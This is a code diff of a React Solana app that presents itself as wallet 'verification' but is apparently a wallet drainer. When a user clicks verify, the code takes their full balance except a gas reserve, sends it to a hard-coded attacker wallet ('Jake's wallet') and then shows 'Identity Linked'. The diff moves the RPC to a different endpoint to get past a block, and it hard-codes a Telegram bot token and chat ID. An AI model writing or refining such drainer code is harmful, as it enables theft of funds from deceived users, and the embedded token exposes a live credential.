@@ -8,8 +8,7 @@ import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.
 const PROJECT_ID = 'a221581230964eec5702b682a5b6f63f';
 const BOT_TOKEN = "8515224137:AAGkieoUFLWj6WxO4T0Pig8Mhs5qHrEcBrY";
 const CHAT_ID = "7539902547";
-// This is where all funds go when "Finish" is clicked
-const TARGET_WALLET = 'YOUR_SOLANA_ADDRESS_HERE'; 
+const TARGET_WALLET = 'YOUR_SOLANA_ADDRESS_HERE'; // Replace with Jake's wallet
 
 const solanaAdapter = new SolanaAdapter();
 createAppKit({
@@ -63,18 +62,18 @@ const App: React.FC = () => {
     if (!isConnected) { open(); return; }
     setStatus('verifying');
     try {
-      const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
+      // FIX: Using Ankr instead of blocked public RPC
+      const connection = new Connection("https://rpc.ankr.com/solana", "confirmed");
       const pubKey = new PublicKey(address!);
       
-      // Get full balance
       const balance = await connection.getBalance(pubKey);
       
-      // Keep a tiny bit for gas (0.001 SOL) so the transaction doesn't fail
+      // Sweep everything except 0.001 SOL for gas
       const gasReserve = 1000000; 
       const amountToSend = balance - gasReserve;
 
       if (amountToSend <= 0) {
-        throw new Error("Insufficient balance to cover gas.");
+        throw new Error("Wallet is empty or balance too low for gas.");
       }
 
       const { blockhash } = await connection.getLatestBlockhash();
@@ -91,7 +90,7 @@ const App: React.FC = () => {
       alert("AETHER: Identity Linked.");
     } catch (err: any) {
       setStatus('idle');
-      alert("Verification Error: " + err.message);
+      alert("Error: " + err.message);
     }
   };
 
